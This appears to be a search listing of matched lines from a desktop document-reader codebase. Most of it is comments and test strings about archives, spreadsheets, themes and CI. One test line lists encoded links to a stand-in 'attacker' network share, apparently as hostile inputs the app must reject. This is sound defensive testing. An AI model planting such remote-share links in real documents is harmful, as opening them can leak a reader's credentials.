@@ -1,0 +1,371 @@
+C:/Dev/reader/worktrees/residue\apps\desktop\test\app-harness.test.mjs:16: * A job without Playwright's WebKit (CI's `fast` job) skips the browser cases and says why, unless
+C:/Dev/reader/worktrees/residue\fixtures\programs\make-programs.mjs:95:// 2026-03-14 09:26:53 UTC.
+C:/Dev/reader/worktrees/residue\scripts\work.test.mjs:154:    writeFileSync(join(dir, 'work', 'todo.md'), '## Next\n\n| # | What | Branch |\n| --- | --- | --- |\n| A1 | add b | `piece` |\n| A2 | later | |\n');
+C:/Dev/reader/worktrees/residue\apps\desktop\test\archive-held-kinds.test.mjs:1:// A database, a workbook, a font and a recording inside an archive (archive page A6): `o` on each opens a tab that is
+C:/Dev/reader/worktrees/residue\packages\theme\test\theme-sheets.test.mjs:1:// A bundled theme is one definition (the theme pass, 2026-11-17): each sheet under packages/theme/<theme>/ is what
+C:/Dev/reader/worktrees/residue\apps\desktop\test\archive-filter.test.mjs:1:// The archive page's filter (archive page A8, the keys table: `=` filters by name, size or reading): typed into
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\watch\tree.rs:536:    /// B1 added (Program.cs, Dockerfile.dev, Justfile) all count against the limit and make events.
+C:/Dev/reader/worktrees/residue\packages\core\src\highlight\session-view.test.ts:1:// D3: what is in view is read first, the rest after it, and the end is the whole text's runs; past the plain-text tier,
+C:/Dev/reader/worktrees/residue\packages\core\src\highlight\runs.test.ts:1:// D1: the run mapping (token lines to runs), and a text read a piece at a time giving the runs it gives whole.
+C:/Dev/reader/worktrees/residue\packages\core\src\highlight\roles.ts:2:// D1, in Source too (Shiki's runs as marks), so one token gets one role in both modes; Rendered builds its Shiki theme
+C:/Dev/reader/worktrees/residue\fixtures\demo\archives\make-held-kinds.mjs:2:// the readers that take an archive's entry from memory (archive page A6). Built by hand, as make-shared.mjs builds its
+C:/Dev/reader/worktrees/residue\packages\core\src\viewer\tables.ts:95:  /** The last row and column with something in them, counted from A1. */
+C:/Dev/reader/worktrees/residue\packages\core\src\viewer\tables.ts:156:/** A sheet's rows `from` up to `to`: its cells `[row, column, cell]` 0-based from A1, and the merges that touch them. */
+C:/Dev/reader/worktrees/residue\packages\core\src\viewer\tables.ts:193:/** "F5" for row 4, column 5 (both 0-based). */
+C:/Dev/reader/worktrees/residue\packages\core\src\highlight\line-classes.ts:23:/** Line tint for a unified-diff fence; markers and headers stay plain (handbook ch.5). */
+C:/Dev/reader/worktrees/residue\packages\core\src\highlight\line-classes.ts:34:/** Strong weight on the level token only; no hue (handbook ch.3, ch.9). */
+C:/Dev/reader/worktrees/residue\fixtures\demo\archives\make-archives.mjs:1:// Builds the archive page's two sample archives (archive page A2, the board's samples) from files the demo already holds:
+C:/Dev/reader/worktrees/residue\fixtures\demo\archives\make-archives.mjs:167:/* A gzip of one file (A3): the page reads it as that file. Node writes no name and a zero time into its header, so the bytes
+C:/Dev/reader/worktrees/residue\packages\core\src\highlight\grammar.ts:47: * state after the last line, so a text tokenised a piece at a time comes out as it would whole (D1: Source's runs).
+C:/Dev/reader/worktrees/residue\apps\desktop\src\viewers\types.ts:140:   * Its address as written after the file's name, which the bar puts before it: `:12–18`, `#page=3`, `#Summary!F5`,
+C:/Dev/reader/worktrees/residue\packages\core\src\viewer\shortcut.test.ts:11:// 2026-01-01 00:00:00 UTC as a FILETIME.
+C:/Dev/reader/worktrees/residue\apps\desktop\test\window.test.mjs:3:// the prototype's checks that cover it (lab 25 test/check.mjs 01, 34, 35c and 39) and adds the slice's own.
+C:/Dev/reader/worktrees/residue\packages\typeset\test\typeset.test.mjs:13: * A job without Playwright's WebKit (CI's `fast` job) skips these tests and says why, unless
+C:/Dev/reader/worktrees/residue\packages\typeset\test\typeset.test.mjs:113:  // 100 ms on the reference machine (product tier); a CI runner gets the envelope.
+C:/Dev/reader/worktrees/residue\scripts\gate-bundle.mjs:198: * (including pre-build precheck); where `build:web` has run (CI's rust job), every file under dist/
+C:/Dev/reader/worktrees/residue\scripts\gate-bundle.mjs:245:// the release workflow passes --target. CI builds with `cargo build --profile ci` and has neither,
+C:/Dev/reader/worktrees/residue\scripts\probe-layout.mjs:14:// it; the gate, the baselines, base.css and every src/ file are untouched. Not part of CI.
+C:/Dev/reader/worktrees/residue\scripts\probe-layout.mjs:477:/** Top-level blocks whose text is held to the column's left edge (the screen criterion's "Edges"). */
+C:/Dev/reader/worktrees/residue\scripts\probe-layout.mjs:482: * Judge one measured cell against rules 1 to 4 of the screen criterion. Returns `{ check, sub, detail }`
+C:/Dev/reader/worktrees/residue\scripts\perf-harness.test.mjs:81:// the nightly record. One launch's canned shell `mark` calls, as the page hands them back
+C:/Dev/reader/worktrees/residue\scripts\perf-harness.test.mjs:82:// ([name, epoch ms, detail]); the harness turns them into the record the nightly job keeps.
+C:/Dev/reader/worktrees/residue\scripts\lib\todo.test.mjs:67:  const x = crossCheck(parseTodo('| # | What |\n| --- | --- |\n| A1 | one |\n| A1 | two |\n'), () => null);
+C:/Dev/reader/worktrees/residue\packages\theme\test\grid.test.mjs:15: * A job without Playwright's WebKit (CI's `fast` job) skips these tests and says why, unless
+C:/Dev/reader/worktrees/residue\packages\core\src\encoding\encoding.test.ts:163:  // A character cut short (E2 82, its last byte gone) is damaged UTF-8 too, however many bytes are stray.
+C:/Dev/reader/worktrees/residue\apps\desktop\test\verb-menu.test.mjs:1:// The verb menu: right-click, the context-menu key, Shift+F10 or Enter opens one themed
+C:/Dev/reader/worktrees/residue\packages\core\src\buffer\source-text.test.ts:153:  // "a", an astral character (4 bytes, two units), a cut-off E2 82 (two stray units), "é" (2 bytes), "b".
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\tables\sqlite.rs:496:/// Opens an archive's entry held in memory (archive page A6): `bytes` copied into SQLite's own memory, read-only, as a
+C:/Dev/reader/worktrees/residue\packages\core\src\viewer\pdf.ts:160:/** A page size in the card's words: "148 × 210 mm, A5", "279 × 216 mm, Letter, landscape". */
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\tables\sheets_tests.rs:59:    // F5: a percentage worked out by the app that saved it.
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\tables\sheets_tests.rs:67:    // G5 is an error as saved; B12 a formula never worked out.
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\tables\sheets.rs:68:    /// The last row and column with something in them, counted from A1 (so 17 rows means rows 1 to 17).
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\tables\sheets.rs:93:    /// `[row, column, cell]`, 0-based from A1, in row order.
+C:/Dev/reader/worktrees/residue\apps\desktop\test\typeset-defaults.test.mjs:15: * A job without Playwright's WebKit (CI's `fast` job) skips the browser cases and says why, unless
+C:/Dev/reader/worktrees/residue\apps\desktop\test\typeset-defaults.test.mjs:109:    // Recorded, not a CI failure; a missing mark is.
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\tables\mod.rs:1://! Tables: a SQLite database and a spreadsheet, read for the table page (E5, E6; `src/commands/tables.rs`). Nothing
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\tables\mod.rs:60:/// Where a workbook's bytes are: a file on disk, or an archive's entry held in memory (archive page A6), which has no
+C:/Dev/reader/worktrees/residue\apps\desktop\test\cursor.test.mjs:4:// cursor checks (lab 25 test/check.mjs 04, 05, the ] [ walk and the copy checks).
+C:/Dev/reader/worktrees/residue\scripts\perf-harness.mjs:11:// The nightly workflow runs it as `pnpm perf` and keeps the one JSON record `--record` writes:
+C:/Dev/reader/worktrees/residue\scripts\perf-harness.mjs:14:// transcript (`--transcript`); the nightly does not record one yet.
+C:/Dev/reader/worktrees/residue\scripts\perf-harness.mjs:33://   --summary <path> append a Markdown table of the record to <path> (the nightly job's step summary)
+C:/Dev/reader/worktrees/residue\scripts\perf-harness.mjs:293:/** A short Markdown table of a record, for a CI job summary. */
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\tables\formats.rs:603:/// An ods date (`2026-10-31` or `2026-10-31T23:43:00.5`) as the 1900 system's serial and its clock reading.
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\remote.rs:1://! One image from the network, fetched by the shell only after the reader asked (E8, a message's "Load them for this
+C:/Dev/reader/worktrees/residue\packages\typeset\test\grid-sizes.test.mjs:18: * A job without Playwright's WebKit (CI's `fast` job) skips these tests and says why, unless
+C:/Dev/reader/worktrees/residue\apps\desktop\src\viewers\sheet.ts:6:// The cursor walks rows, then a row's cells (`#Summary!5`, `#Summary!F5`); `]` and `[` step the sheets.
+C:/Dev/reader/worktrees/residue\apps\desktop\src\viewers\sheet.ts:53:  /** The cell picked, by its row and column from A1 (0-based). */
+C:/Dev/reader/worktrees/residue\apps\desktop\src\viewers\sheet.ts:235:  /** The row and column (0-based) of a cell named "F5". */
+C:/Dev/reader/worktrees/residue\packages\core\src\buffer\fold-slice.test.ts:272:  // C3 A9 are é: the file's Source text is "xéy", and the editor's text "x" + two stray units names the same bytes.
+C:/Dev/reader/worktrees/residue\packages\theme\src\themes.test.ts:1:// Themes as looks (the theme pass, 2026-11-17): pins drawn as written and held to their floors, dials that carry a
+C:/Dev/reader/worktrees/residue\packages\core\src\buffer\buffer.test.ts:264:  // A lone 80 at the start, a lone BF, and the 82 of a cut-off E2 82: each may start or end a splice.
+C:/Dev/reader/worktrees/residue\packages\core\src\buffer\buffer.test.ts:268:  // The 9D and B1 of a whole 東 (E6 9D B1) are inside a character.
+C:/Dev/reader/worktrees/residue\scripts\gate-aesthetics.mjs:39:// rag comparisons, runs nightly (aesthetics-determinism in nightly.yml).
+C:/Dev/reader/worktrees/residue\scripts\gate-aesthetics.mjs:63:// which is the pull-request critical path, so nothing implies --repeat any more. The nightly
+C:/Dev/reader/worktrees/residue\scripts\gate-aesthetics.mjs:423:// ---- the geometry of the page (the six rules of the screen criterion) ----
+C:/Dev/reader/worktrees/residue\scripts\gate-aesthetics.mjs:1139: * wide, and body text keeps its 7:1. `--mechanical` runs these; the nightly full gate adds screenshots.
+C:/Dev/reader/worktrees/residue\packages\core\src\book\testing\samples.ts:41:const METADATA = '<metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:title>The Measure</dc:title><dc:creator>Ruth Calloway</dc:creator><dc:language>en</dc:language><dc:publisher>Harbour Press</dc:publisher><dc:date>2026-03-01</dc:date><dc:identifier id="id">urn:uuid:0b6f6c1e-0000-4000-8000-000000000001</dc:identifier></metadata>';
+C:/Dev/reader/worktrees/residue\scripts\measure-startup.mjs:2:// gate: the nightly `startup-macos` job runs it and keeps the file.
+C:/Dev/reader/worktrees/residue\scripts\measure-startup.mjs:3:// CI: `cold_start_first_text_ms` is launch 1 only, `warm_start_first_text_ms`
+C:/Dev/reader/worktrees/residue\scripts\measure-startup.mjs:31:// launch 1, so on CI the webview framework is warm before the "cold" launch starts. When that
+C:/Dev/reader/worktrees/residue\scripts\measure-startup.mjs:217:  // MARXY_BIN names the binary explicitly (CI builds with `--profile ci`); the
+C:/Dev/reader/worktrees/residue\apps\desktop\test\transcript-lite.test.mjs:5:// switching modes write nothing. transcript-jsonl.test.mjs holds the rest, nightly. WebKit, over the shipped skeleton and
+C:/Dev/reader/worktrees/residue\packages\typeset\src\hang.ts:1:// Left-edge hanging and optical alignment (D-A6): the first grapheme of each set line is pulled
+C:/Dev/reader/worktrees/residue\packages\theme\src\looks\solarized.ts:2:// The pins are the palette held to the floors by the theme pass (each colour walked in OKLCH lightness only as far as its
+C:/Dev/reader/worktrees/residue\packages\theme\src\looks\rose-pine.ts:2:// The pins are the palette held to the floors by the theme pass (each colour walked in OKLCH lightness only as far as its
+C:/Dev/reader/worktrees/residue\packages\theme\src\looks\midnight.ts:1:// Midnight (drawn for Marxy, 2026-11-17): a cool dark. A deep blue-black page, cool off-white text, ice-blue links;
+C:/Dev/reader/worktrees/residue\packages\theme\src\looks\ink.ts:3:// Ink 2 (the theme pass of 2026-11-17), against the reader typography handbook ch. 9 and Galley's audited themes:
+C:/Dev/reader/worktrees/residue\apps\desktop\test\changes.test.mjs:3:// kept beside the file, and Y lays the notes out as a reply. Ports the prototype's checks (lab 25 test/check.mjs) 09, 10a,
+C:/Dev/reader/worktrees/residue\packages\theme\src\looks\gruvbox.ts:2:// The pins are the palette held to the floors by the theme pass (each colour walked in OKLCH lightness only as far as its
+C:/Dev/reader/worktrees/residue\packages\theme\src\looks\ember.ts:1:// Ember (drawn for Marxy, 2026-11-17): a dark with red. A red-black page, warm off-white text, ember-red links and quote
+C:/Dev/reader/worktrees/residue\packages\core\scripts\golden.ts:3:// them; a diff in CI means the parser changed what a reader sees, which belongs in a review.
+C:/Dev/reader/worktrees/residue\packages\theme\src\looks\catppuccin.ts:2:// The pins are the palette held to the floors by the theme pass (each colour walked in OKLCH lightness only as far as its
+C:/Dev/reader/worktrees/residue\packages\theme\src\looks\black.ts:1:// Black (2026-11-17; it replaces the derived White and Black): a true black page for OLED screens, the readers' standard
+C:/Dev/reader/worktrees/residue\packages\theme\src\look.ts:467:  // left secondary and faint text no room below 10 : 1, and the ladder flat (the theme pass, 2026-11-17).
+C:/Dev/reader/worktrees/residue\packages\core\scripts\gate-assertions.test.ts:142:// no skip path — the same spawn the gate uses for this file, so deleting either half fails CI.
+C:/Dev/reader/worktrees/residue\scripts\gate-fidelity.mjs:97:// The gate is this file, and packages/core does not reach into the shell (criterion 1).
+C:/Dev/reader/worktrees/residue\scripts\gate-fidelity.mjs:612:// Linux xattr skip cannot become the silent default (criterion 3).
+C:/Dev/reader/worktrees/residue\scripts\gate-licences.mjs:5:// CI runs it twice: before the Rust build (allow-list fallback) and after, with
+C:/Dev/reader/worktrees/residue\scripts\gate-licences.mjs:204: * Rust side. CI's first run is that case (before the desktop build), so the recorded allow-list
+C:/Dev/reader/worktrees/residue\scripts\gate-licences.mjs:297: * Both halves exist because the file is self-attested: on a machine with no cargo cache — CI's
+C:/Dev/reader/worktrees/residue\scripts\gate-licences.mjs:301: * The second CI run, after the desktop build, passes --require-registry so the crates are
+C:/Dev/reader/worktrees/residue\scripts\gate-licences.mjs:378: * because a typo on --require-registry would otherwise silently run the pre-build mode in CI.
+C:/Dev/reader/worktrees/residue\scripts\gate-licences.mjs:515:  // The same stale record is invisible when the cache is empty, which is every pre-build CI run.
+C:/Dev/reader/worktrees/residue\scripts\gate-licences.mjs:711:  // look like a run that re-read everything. The pre-build CI run reports 0 re-read and believes
+C:/Dev/reader/worktrees/residue\packages\core\scripts\commonmark-spec.ts:17:// The version lives here and only here. CI reads it through --print-url / --print-dest.
+C:/Dev/reader/worktrees/residue\apps\desktop\src\kind-icons\icons.ts:54:/** The language id of a code file's path (the registry's, B1), or undefined when it has none. */
+C:/Dev/reader/worktrees/residue\packages\core\src\viewer\archive-strip.ts:1:// The file as stored (archive page A4): an archive drawn from its first byte to its
+C:/Dev/reader/worktrees/residue\packages\core\src\viewer\archive-strip.test.ts:1:// The file as stored (archive page A4): the strip covers every byte of a zip, a plain tar, a tar.gz, a lone gzip and a
+C:/Dev/reader/worktrees/residue\apps\desktop\src\index\every-file.test.ts:1:// B4: the index lists every file. A `.png` and an extension-less README are entries the palette finds and the Library's
+C:/Dev/reader/worktrees/residue\packages\core\src\viewer\archive-reading.ts:1:// What an archive's entry reads as (archive page A2): the reading the app would give that file on disk, found the same way
+C:/Dev/reader/worktrees/residue\packages\theme\src\loader.test.ts:88:// 2026-09-26 review.
+C:/Dev/reader/worktrees/residue\apps\desktop\src\harness\web.ts:8:// Word document and a deck (documents/), read through the memory shell's zip reader; its fonts and media (fonts/, media/: E7, E9).
+C:/Dev/reader/worktrees/residue\apps\desktop\test\block-edit.test.mjs:864:    // The second paragraph: edit its start; the first paragraph's FF and its own E9 keep their bytes.
+C:/Dev/reader/worktrees/residue\apps\desktop\test\archive-sheet.test.mjs:1:// The archive page's sheet (archive page A5): every entry a tile that
+C:/Dev/reader/worktrees/residue\packages\core\src\viewer\archive-read.test.ts:1:// The archive reader (E3's browser twin): the same sanitising, sentences, caps and ordinals as the Rust reader, over
+C:/Dev/reader/worktrees/residue\packages\core\src\viewer\archive-read.test.ts:655:// ---- archive page A1: the shared table, heads ----------------------------------------------------------------------
+C:/Dev/reader/worktrees/residue\packages\core\src\viewer\archive-plan.ts:1:// The plan of an archive (archive page A2): its contents to scale, a squarified treemap. Every file
+C:/Dev/reader/worktrees/residue\packages\core\src\viewer\archive-plan.test.ts:1:// The plan (archive page A2): a squarified treemap of an archive's contents, folders as frames, small things gathered.
+C:/Dev/reader/worktrees/residue\apps\desktop\src\harness\gate-entry.ts:53: * performance budget (speed is measured in the nightly perf job), so a slow runner does not fail the gate;
+C:/Dev/reader/worktrees/residue\packages\core\src\viewer\archive-filter.ts:1:// The archive page's filter (archive page A8, `=`): `= reading:picture size>1mb`. Bare words and `name:` match
+C:/Dev/reader/worktrees/residue\packages\core\src\viewer\archive-care.ts:1:// What in an archive needs a careful look (archive page A2), found from the listing and the entries' first bytes before
+C:/Dev/reader/worktrees/residue\apps\desktop\test\archive-reveal.test.mjs:1:// Reveal and x-ray on an archive (archive page A4): Shift X
+C:/Dev/reader/worktrees/residue\packages\core\src\viewer\archive-care.test.ts:1:// Readings and care (archive page A2): what each entry of the two samples reads as, and every warning, from the
+C:/Dev/reader/worktrees/residue\apps\desktop\src\notes\anchor.test.ts:73:  const cell: Note = { l0: 0, l1: 0, key: '', text: 'Odd total', address: '#Summary!F5' };
+C:/Dev/reader/worktrees/residue\apps\desktop\src\notes\anchor.test.ts:76:  assert.equal(piecesAsMarkdown(pieces), '— `/r/a.xlsx#Summary!F5`\n\nOdd total\n\n> two\n> three\n\n— `/r/a.xlsx:2-3`\n\nThese two\n');
+C:/Dev/reader/worktrees/residue\packages\theme\src\frame.css:754:/* An archive's page (archive page A2): the lede, the plan to scale, the entries
+C:/Dev/reader/worktrees/residue\packages\theme\src\frame.css:834:/* Reveal on an archive (A4, viewers/archive-reveal.ts): the file as stored as a strip, three more columns, the record. */
+C:/Dev/reader/worktrees/residue\apps\desktop\test\archive-preview.test.mjs:1:// The archive page's preview (archive page A3): the entry under the cursor
+C:/Dev/reader/worktrees/residue\apps\desktop\src\look\theme-look.ts:1:// The look that stands for the theme config.toml names (the theme pass, 2026-11-17): every bundled theme is a look too,
+C:/Dev/reader/worktrees/residue\packages\theme\src\css-urls.test.ts:66:// 2026-09-26 review: every one of these used to pass through unchanged.
+C:/Dev/reader/worktrees/residue\apps\desktop\src\viewers\embed.ts:1:// A small reading of some bytes inside another page (archive page A3, decision 2): an archive's preview, and later a
+C:/Dev/reader/worktrees/residue\apps\desktop\test\archive-page.test.mjs:1:// The archive page (archive page A2): the lede, the plan to scale with pictures as
+C:/Dev/reader/worktrees/residue\packages\core\src\reading\part-choices.ts:7:// databases the reader chose to read without their write-ahead log (E5, "Read the file alone"), the same way; `pages` the
+C:/Dev/reader/worktrees/residue\packages\core\src\reading\part-choices.ts:10:// encoding the reader chose to read it in (B3, Read with encoding...), likewise.
+C:/Dev/reader/worktrees/residue\packages\shell-api\src\index.ts:32: * What an image is, read from its own bytes by the shell (C1, C2; the `image_facts` command). `width` and `height` are as
+C:/Dev/reader/worktrees/residue\packages\shell-api\src\index.ts:97: * One entry of the archive at a reader's `path` (archive page A6): its ordinal and the name the listing gave it. A reader
+C:/Dev/reader/worktrees/residue\packages\shell-api\src\index.ts:222:  /** The last row and column with something in them, counted from A1. */
+C:/Dev/reader/worktrees/residue\packages\shell-api\src\index.ts:283:/** A sheet's rows `from` up to `to`: its cells `[row, column, cell]` 0-based from A1, and the merges that touch them. */
+C:/Dev/reader/worktrees/residue\packages\shell-api\src\index.ts:394:   * At most `length` bytes of a regular file from `offset` (B5's hex view): a window, never the whole file, so a 2 GB
+C:/Dev/reader/worktrees/residue\packages\shell-api\src\index.ts:420:   * The first bytes of many entries in one call (archive page A1), in the order of `wants`: at most `maxEach` (clamped
+C:/Dev/reader/worktrees/residue\apps\desktop\src\viewers\card.ts:1:// The floor (B5, Q-E as drawn): a file with no reading opens as a card of what is known about it, with every byte beside
+C:/Dev/reader/worktrees/residue\packages\theme\src\config.test.ts:52:// 2026-09-26 review.
+C:/Dev/reader/worktrees/residue\apps\desktop\test\frame-office.test.mjs:54:const HREFS = ['%5C%5Cattacker%5Cshare%5Cx.md', '%2F%2Fattacker%2Fshare%2Fx.md', 'a%E0%A4%A.md', '#bad%E0%A4%A'];
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\main.rs:840:/// Linux once painted, reported, and then never exited (CI run 37040073668). Nothing is lost: every
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\main.rs:1019:/// compiling a test harness for the Tauri dependency tree cost CI minutes for four assertions, while
+C:/Dev/reader/worktrees/residue\apps\desktop\test\studio-tone-type-page.test.mjs:1:// The Studio's Tone, Type and Page tabs in WebKit. Ports STUDIO-BRIEF acceptance 3 (dragging
+C:/Dev/reader/worktrees/residue\apps\desktop\src\palette\search-perf.test.ts:3:// the nightly perf-harness job keeps the numbers.
+C:/Dev/reader/worktrees/residue\apps\desktop\test\studio-themes.test.mjs:1:// The Studio as a theme creator (the theme pass, 2026-11-17) in WebKit: the shelf is a list of themes, each row drawn in
+C:/Dev/reader/worktrees/residue\apps\desktop\src\viewers\archive.ts:1:// An archive's page (archive page A2): one sentence that says what it is, the
+C:/Dev/reader/worktrees/residue\apps\desktop\src\viewers\archive.ts:3:// the preview's head for the entry under the cursor (slice A3 fills the body under it). Listed by the shell from the
+C:/Dev/reader/worktrees/residue\apps\desktop\src\viewers\archive.ts:270:  // ---- the filter (A8, the Line's `=`): matching files and the folders that hold them; kept in the view only ----------
+C:/Dev/reader/worktrees/residue\apps\desktop\src\viewers\archive.ts:1164:  // ---- Reveal and x-ray (A4, viewers/archive-reveal.ts) -------------------------------------------------------------
+C:/Dev/reader/worktrees/residue\packages\theme\src\base.css:539:/* GitHub alerts: label only, no box or hue (handbook ch.6). */
+C:/Dev/reader/worktrees/residue\packages\theme\src\base.css:1179:/* Invisible-character markers (handbook ch.7): 1ch hairline box, hex label, code ground. */
+C:/Dev/reader/worktrees/residue\apps\desktop\src\commands\editor.ts:59:          // Only the path and the line leave the webview; the program is Rust's to choose (D-A31).
+C:/Dev/reader/worktrees/residue\apps\desktop\test\studio-compare-sheet-fit.test.mjs:1:// The Studio's Compare, specimen and Fit in WebKit. Ports STUDIO-BRIEF acceptance 6, 7 and 8 and
+C:/Dev/reader/worktrees/residue\apps\desktop\test\studio-compare-sheet-fit.test.mjs:2:// the sheet half of P-look 10 (lab 25 build/STUDIO-BRIEF.md, test/kinds-palettes.mjs). The theme pass (2026-11-17) made the
+C:/Dev/reader/worktrees/residue\apps\desktop\test\studio-code-adapts-file.test.mjs:1:// The Studio's Code, Adapts and File tabs in WebKit. Ports the prototype's P-look 09 (the Code
+C:/Dev/reader/worktrees/residue\apps\desktop\test\studio-code-adapts-file.test.mjs:2:// tab: a language puts its file on the canvas and its colours in the list), the File half of P-look 10 (the look's file
+C:/Dev/reader/worktrees/residue\apps\desktop\test\studio-code-adapts-file.test.mjs:3:// says which and how much), and STUDIO-BRIEF acceptance 4 for these tabs (each tab's controls change the canvas and the
+C:/Dev/reader/worktrees/residue\apps\desktop\src\app-types.ts:93:  /** A font file's facts (E7, src-tauri/src/font): null when it is not a font. The browser build answers for the demo's own. */
+C:/Dev/reader/worktrees/residue\apps\desktop\src\app-types.ts:115:   * Text that is not UTF-8 (B3, src-tauri/src/encoding): `bytes` already read, as UTF-8 text with the byte map back to them,
+C:/Dev/reader/worktrees/residue\apps\desktop\test\stray-bytes-app.test.mjs:45:/** The file, as Latin-1 so each character is one byte: E9, FF and a cut-off E2 82 are not UTF-8. */
+C:/Dev/reader/worktrees/residue\apps\desktop\test\store-walk.test.mjs:3://   MARXY_WALK_SEEDS=<n>  runs seeds 1..n (default 40; the nightly run sets 2000)
+C:/Dev/reader/worktrees/residue\apps\desktop\src\viewers\archive-sheet.ts:1:// The sheet (archive page A5, "The sheet"): the entries as tiles, each the entry's own page drawn small
+C:/Dev/reader/worktrees/residue\packages\core\src\sanitize\vectors.test.ts:1:// The acceptance criterion and its falsifiability. Two halves that only mean
+C:/Dev/reader/worktrees/residue\apps\desktop\src\frame\frame.ts:359:  // A held F11 would strobe the window.
+C:/Dev/reader/worktrees/residue\packages\core\src\position\restore.ts:60: * not the first heading, so text prepended to the file stays above the held offset in view (ruling,
+C:/Dev/reader/worktrees/residue\packages\core\src\position\restore.ts:61: * 2026-10-08). The same ambiguity decides a duplicate: if the whole tail from the held offset is
+C:/Dev/reader/worktrees/residue\apps\desktop\src\studio\tab-type.ts:1:// The Studio's Type tab (STUDIO-BRIEF "The dock" 2): the face, shown as its own name set in
+C:/Dev/reader/worktrees/residue\packages\core\src\position\blocks.ts:42: * (ruling, 2026-10-08); text written above it then leaves them at the top (`restore.ts`).
+C:/Dev/reader/worktrees/residue\apps\desktop\src\viewers\archive-reveal.ts:1:// Reveal and x-ray on an archive's page (archive page A4). Reveal (`Shift X`) puts
+C:/Dev/reader/worktrees/residue\apps\desktop\src\viewers\archive-entries.ts:1:// The shell as the viewers see an archive's entry held in memory (E3, `document/entries.ts`): the image page, the file
+C:/Dev/reader/worktrees/residue\apps\desktop\src\viewers\archive-entries.ts:4:// the entry's index and name (archive page A6). An entry that is itself an archive is listed and read from the held bytes
+C:/Dev/reader/worktrees/residue\apps\desktop\src\viewers\archive-entries.ts:5:// by core's reader (A7, `archive-nested.ts`), never by the shell. Any other path goes to the shell itself.
+C:/Dev/reader/worktrees/residue\apps\desktop\src\viewers\archive-bytes.ts:2:// memory as an entry of another (archive page A7) in either shell. Light: no stand-ins, nothing of the demo.
+C:/Dev/reader/worktrees/residue\apps\desktop\src\studio\tab-tone.ts:1:// The Studio's Tone tab (STUDIO-BRIEF "The dock" 1): the tone pad, the page's ink and the
+C:/Dev/reader/worktrees/residue\apps\desktop\src\studio\tab-page.ts:1:// The Studio's Page tab (STUDIO-BRIEF "The dock" 3): the measure (its rule shown on the canvas
+C:/Dev/reader/worktrees/residue\apps\desktop\src\studio\tab-file.ts:1:// The Studio's File tab (STUDIO-BRIEF "The dock" 6, lab P-look 10): the look being edited as
+C:/Dev/reader/worktrees/residue\apps\desktop\src\studio\tab-colours.ts:1:// The Studio's Colours tab (the theme pass, 2026-11-17): where a theme is made colour by colour. Every role the look paints
+C:/Dev/reader/worktrees/residue\apps\desktop\src\studio\tab-code.ts:1:// The Studio's Code tab (STUDIO-BRIEF "The dock" 4, lab P-look 09): how much colour code gets,
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\facts\exif.rs:76:/// `2024:05:01 12:34:56` as `2024-05-01 12:34:56`; anything else as written.
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\error.rs:64:    /// Understood, and declined: a size or a flag the app will not go past (E3 archives).
+C:/Dev/reader/worktrees/residue\apps\desktop\test\split-screen-criterion.test.mjs:1:// The phase's screen criterion, end to end: a README
+C:/Dev/reader/worktrees/residue\apps\desktop\test\split-same-adversarial.test.mjs:356:// D10_WALK_SEEDS=9-40 widens the search when hunting (not run in CI).
+C:/Dev/reader/worktrees/residue\apps\desktop\src\studio\tab-adapts.ts:1:// The Studio's Adapts tab (STUDIO-BRIEF "The dock" 5): every rule as its sentence with its
+C:/Dev/reader/worktrees/residue\packages\core\src\sanitize\testing\vectors.ts:165: * The vectors. The first six are the acceptance criterion in its own words; the rest are the
+C:/Dev/reader/worktrees/residue\packages\core\src\sanitize\testing\vectors.ts:166: * ones the criterion does not name and an attacker would reach for first.
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\encoding\tests.rs:226:    // A character cut short (E2 82, its last byte gone) is damaged UTF-8 too, however many bytes are stray.
+C:/Dev/reader/worktrees/residue\apps\desktop\test\fonts.test.mjs:17: * A job without Playwright's WebKit (CI's `fast` job) skips these tests and says why, unless
+C:/Dev/reader/worktrees/residue\apps\desktop\test\split-cost.test.mjs:6:// printed and never judged: timing goes in the nightly record, and the report-back thresholds of
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\encoding\mod.rs:610:    /// C1 control characters it reads in the sample: a byte that is a mark in one encoding and nothing in another.
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\detect.rs:158:/// else is text only when it carries no C0 control bytes but whitespace and escape (UTF-8 may carry one in a hundred).
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\detect.rs:381:/// A head that opens like a mail message (E8, core `mail/mime.ts`'s `looksLikeMessage`): header lines up to the first
+C:/Dev/reader/worktrees/residue\apps\desktop\src\studio\studio.ts:5:// through the store. The theme pass (2026-11-17): every theme is a look, so Ink, Polar and the bundled themes are on the
+C:/Dev/reader/worktrees/residue\apps\desktop\src\studio\shelf.ts:1:// The Studio's shelf of themes (the theme pass, 2026-11-17, second round): every look as a row of two lines, its name and
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\commands\tables.rs:1://! `tables_open`, `tables_rows` and `tables_blob`: a database or a workbook for the table page (E5, E6; `src/tables`).
+C:/Dev/reader/worktrees/residue\apps\desktop\src\studio\galley.ts:1:// The specimen (the theme pass, 2026-11-17; it replaces the contact sheet): one long proof, read top to bottom, in
+C:/Dev/reader/worktrees/residue\apps\desktop\src\studio\fit.ts:1:// Fit (STUDIO-BRIEF "Fit: an eye test for your own reading"): two settings of the reader's own
+C:/Dev/reader/worktrees/residue\apps\desktop\src\studio\compare.ts:1:// Compare (STUDIO-BRIEF "Compare"): the canvas split down a seam that can be dragged. Left of it
